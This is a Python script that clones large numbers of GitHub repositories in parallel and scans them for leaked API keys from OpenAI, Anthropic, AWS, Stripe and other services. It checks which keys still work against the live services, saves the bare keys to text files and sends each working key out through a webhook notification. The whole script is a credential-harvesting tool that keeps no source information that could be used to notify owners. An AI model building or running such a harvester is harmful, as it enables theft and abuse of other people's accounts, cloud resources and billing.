import os
import subprocess
import concurrent.futures
import time
from datetime import datetime
from pathlib import Path
import re
import shutil
from config import API_KEY_PATTERNS
from key_validator import KeyValidator
from webhook_notifier import send_webhook_notification

def scan_repo_for_keys(repo_path):
    """
    Scan a downloaded repository for API keys.
    Returns list of found keys with their types.
    """
    found_keys = []
    validator = KeyValidator()
    
    # File extensions to scan (code files and config files)
    code_extensions = {'.py', '.js', '.ts', '.java', '.go', '.rs', '.cpp', '.c', '.php', '.rb', '.swift', '.kt'}
    config_extensions = {'.env', '.yaml', '.yml', '.json', '.toml', '.ini', '.conf', '.config'}
    text_extensions = {'.txt', '.md', '.sh', '.bat', '.ps1'}
    
    all_extensions = code_extensions | config_extensions | text_extensions
    
    try:
        # Walk through all files in the repo
        for root, dirs, files in os.walk(repo_path):
            # Skip hidden directories and common ignore patterns
            dirs[:] = [d for d in dirs if not d.startswith('.') and d not in {'node_modules', '__pycache__', 'venv', '.git'}]
            
            for file in files:
                if file.startswith('.'):
                    continue
                    
                file_path = os.path.join(root, file)
                file_ext = Path(file_path).suffix.lower()
                
                # Only scan relevant file types
                if file_ext not in all_extensions and not file_ext == '':
                    continue
                
                try:
                    # Read file content
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    
                    # Check each API key pattern
                    for key_type, patterns in API_KEY_PATTERNS.items():
                        for pattern in patterns:
                            matches = pattern.finditer(content)
                            for match in matches:
                                # Extract key: use capture group if present, otherwise use full match
                                if match.groups():
                                    key = match.group(1)  # Use captured group
                                else:
                                    key = match.group(0)  # Use full match
                                
                                # Clean up key: remove quotes if present
                                if key:
                                    key = key.strip('"\'')
                                
                                # Only add if it's a valid key and not already found
                                if key and key not in [k['key'] for k in found_keys]:
                                    # Additional validation: skip if it looks like a hash (sha512, sha256, etc.)
                                    if key.lower().startswith(('sha', 'md5', 'base64')):
                                        continue
                                    
                                    # Validate the key matches the expected format for this type
                                    # Skip Pinecone keys that are just UUIDs without context
                                    if key_type == 'pinecone':
                                        # Only save if it was found in a context pattern (has capture group)
                                        if not match.groups():
                                            continue  # Skip standalone UUIDs
                                    
                                    # Skip Cohere keys that don't have context
                                    if key_type == 'cohere':
                                        if not match.groups():
                                            continue  # Skip standalone 40-char strings
                                    
                                    # Validate key length based on type
                                    key_clean = key.strip('"\'').strip()
                                    valid_length = False
                                    
                                    if key_type == 'openai_standard' and len(key_clean) == 51 and key_clean.startswith('sk-'):
                                        valid_length = True
                                    elif key_type == 'openai_project' and key_clean.startswith('sk-proj-') and len(key_clean) >= 57:
                                        valid_length = True
                                    elif key_type == 'anthropic' and key_clean.startswith('sk-ant-api03-') and len(key_clean) >= 95:
                                        valid_length = True
                                    elif key_type == 'google_gemini' and key_clean.startswith('AIza') and len(key_clean) == 39:
                                        valid_length = True
                                    elif key_type == 'huggingface' and key_clean.startswith('hf_') and len(key_clean) == 37:
                                        valid_length = True
                                    elif key_type == 'perplexity' and key_clean.startswith('pplx-') and len(key_clean) >= 45:
                                        valid_length = True
                                    elif key_type == 'cohere' and len(key_clean) == 40:
                                        valid_length = True
                                    elif key_type == 'pinecone' and len(key_clean) == 36 and '-' in key_clean:
                                        valid_length = True
                                    elif key_type == 'aws' and (key_clean.startswith('AKIA') or len(key_clean) == 40):
                                        valid_length = True
                                    elif key_type == 'github' and (key_clean.startswith('ghp_') or key_clean.startswith('github_pat_')):
                                        valid_length = True
                                    elif key_type == 'stripe' and (key_clean.startswith('sk_live_') or key_clean.startswith('pk_live_')):
                                        valid_length = True
                                    
                                    if valid_length:
                                        found_keys.append({
                                            'key': key_clean,
                                            'type': key_type,
                                            'file': file_path,
                                            'line': content[:match.start()].count('\n') + 1
                                        })
                except Exception:
                    continue  # Skip files that can't be read
    except Exception:
        pass
    
    return found_keys

def download_and_scan_repo(url):
    """
    Downloads one repository and scans it for API keys.
    Returns result message and found keys.
    """
    start_time = time.time()
    
    # Create a folder name from the URL
    folder_name = url.split("github.com/")[1].replace(".git", "").replace("/", "_")
    output_path = os.path.join("downloaded_repos", folder_name)
    
    repo_downloaded = False
    download_time = 0
    
    try:
        if os.path.exists(output_path):
            # Still scan existing repos for keys
            scan_start = time.time()
            found_keys = scan_repo_for_keys(output_path)
            scan_time = time.time() - scan_start
            
            # Delete after scanning (even if it existed before)
            delete_start = time.time()
            try:
                shutil.rmtree(output_path)
                delete_time = time.time() - delete_start
            except Exception:
                delete_time = time.time() - delete_start
                pass  # Ignore deletion errors
            
            total_time = time.time() - start_time
            
            if found_keys:
                return f"⏱️  {total_time:.2f}s | 🔍 {scan_time:.2f}s | 🗑️  {delete_time:.2f}s | ✅ Scanned & deleted: {folder_name} | 🔑 {len(found_keys)} keys", found_keys
            return f"⏱️  {total_time:.2f}s | 🔍 {scan_time:.2f}s | 🗑️  {delete_time:.2f}s | ✅ Scanned & deleted: {folder_name}", []
        
        # Download the repo
        download_start = time.time()
        subprocess.run(
            ["git", "clone", "--depth", "1", "--quiet", "--single-branch", url, output_path],
            check=True,
            timeout=30,  # Reduced timeout for faster failure
            capture_output=True  # Suppress output
        )
        download_time = time.time() - download_start
        repo_downloaded = True
        
        # Scan for keys
        scan_start = time.time()
        found_keys = scan_repo_for_keys(output_path)
        scan_time = time.time() - scan_start
        
        # Delete repo immediately after scanning to save space
        delete_start = time.time()
        try:
            shutil.rmtree(output_path)
            delete_time = time.time() - delete_start
        except Exception as e:
            delete_time = time.time() - delete_start
            # Continue even if deletion fails
        
        total_time = time.time() - start_time
        
        if found_keys:
            return f"⏱️  {total_time:.2f}s | ⬇️  {download_time:.2f}s | 🔍 {scan_time:.2f}s | 🗑️  {delete_time:.2f}s | ✅ {folder_name} | 🔑 {len(found_keys)} keys", found_keys
        return f"⏱️  {total_time:.2f}s | ⬇️  {download_time:.2f}s | 🔍 {scan_time:.2f}s | 🗑️  {delete_time:.2f}s | ✅ {folder_name}", []
        
    except subprocess.TimeoutExpired:
        # Clean up if download started but timed out
        if repo_downloaded or os.path.exists(output_path):
            try:
                shutil.rmtree(output_path)
            except Exception:
                pass
        total_time = time.time() - start_time
        return f"⏱️  {total_time:.2f}s | ❌ Timeout: {url}", []
    except subprocess.CalledProcessError:
        # Clean up if download failed
        if os.path.exists(output_path):
            try:
                shutil.rmtree(output_path)
            except Exception:
                pass
        total_time = time.time() - start_time
        return f"⏱️  {total_time:.2f}s | ❌ Failed: {url}", []
    except Exception as e:
        # Clean up on any error
        if os.path.exists(output_path):
            try:
                shutil.rmtree(output_path)
            except Exception:
                pass
        total_time = time.time() - start_time
        return f"⏱️  {total_time:.2f}s | ❌ Error: {url} ({str(e)[:30]})", []

def save_key(key_data, key_type, is_working=False):
    """
    Save found API key to file immediately (only the key, no metadata).
    """
    filename = "working_api_keys.txt" if is_working else "found_api_keys.txt"
    
    with open(filename, "a", encoding="utf-8") as f:
        f.write(f"{key_data['key']}\n")
        f.flush()

def bulk_downloader():
    """
    Main function: Download repos and scan for API keys.
    """
    # Create output directory
    if not os.path.exists("downloaded_repos"):
        os.makedirs("downloaded_repos")
    
    # Initialize key files if they don't exist
    if not os.path.exists("found_api_keys.txt"):
        with open("found_api_keys.txt", "w") as f:
            pass  # Create empty file
    if not os.path.exists("working_api_keys.txt"):
        with open("working_api_keys.txt", "w") as f:
            pass  # Create empty file
    
    # Initialize key validator
    validator = KeyValidator()
    
    # Initialize key files (just create empty files, no headers)
    # Keys will be written one per line, no metadata
    
    # Read repo URLs
    if not os.path.exists("repo_list.txt"):
        print("❌ Error: repo_list.txt not found. Run big.py first!")
        return
    
    with open("repo_list.txt", "r") as f:
        urls = [line.strip() for line in f if line.strip()]
    
    total_repos = len(urls)
    print(f"🚀 Starting download and scan of {total_repos} repositories...")
    print(f"📊 Using 30 parallel workers for maximum speed")
    print(f"🗑️  Repositories will be deleted after scanning to save disk space")
    print(f"⏱️  Timing: Total | Download | Scan | Delete | Status")
    print(f"{'='*80}")
    
    start_time = time.time()
    completed = 0
    total_keys_found = 0
    total_working_keys = 0
    
    # Use 30 workers for faster processing
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        # Submit all tasks
        future_to_url = {executor.submit(download_and_scan_repo, url): url for url in urls}
        
        # Process results as they complete
        for future in concurrent.futures.as_completed(future_to_url):
            completed += 1
            url = future_to_url[future]
            
            try:
                result_msg, found_keys = future.result()
                print(result_msg)
                
                # Process found keys
                for key_data in found_keys:
                    total_keys_found += 1
                    save_key(key_data, key_data['type'], is_working=False)
                    
                    # Test if key is working
                    try:
                        is_valid, message = validator.validate_key(key_data['type'], key_data['key'])
                        if is_valid:
                            total_working_keys += 1
                            save_key(key_data, key_data['type'], is_working=True)
                            # Send webhook notification
                            send_webhook_notification(key_data['key'], key_data['type'], message)
                    except Exception:
                        pass  # Skip validation errors
                
                # Progress update every 10 repos
                if completed % 10 == 0:
                    elapsed = time.time() - start_time
                    rate = completed / elapsed if elapsed > 0 else 0
                    remaining = (total_repos - completed) / rate if rate > 0 else 0
                    print(f"\n📈 Progress: {completed}/{total_repos} ({completed*100//total_repos}%) | "
                          f"Rate: {rate:.1f} repos/sec | "
                          f"ETA: {remaining:.0f}s | "
                          f"Keys: {total_keys_found} found, {total_working_keys} working\n")
                
            except Exception as e:
                print(f"❌ Exception processing {url}: {e}")
    
    # Final summary
    total_time = time.time() - start_time
    print(f"\n{'='*80}")
    print(f"✅ Completed: {completed}/{total_repos} repositories")
    print(f"⏱️  Total time: {total_time:.1f}s ({total_time/60:.1f} minutes)")
    print(f"📊 Average rate: {completed/total_time:.2f} repos/sec")
    print(f"🔑 Keys found: {total_keys_found} total, {total_working_keys} working")
    print(f"💾 Results saved to: found_api_keys.txt and working_api_keys.txt")

if __name__ == "__main__":
    bulk_downloader()
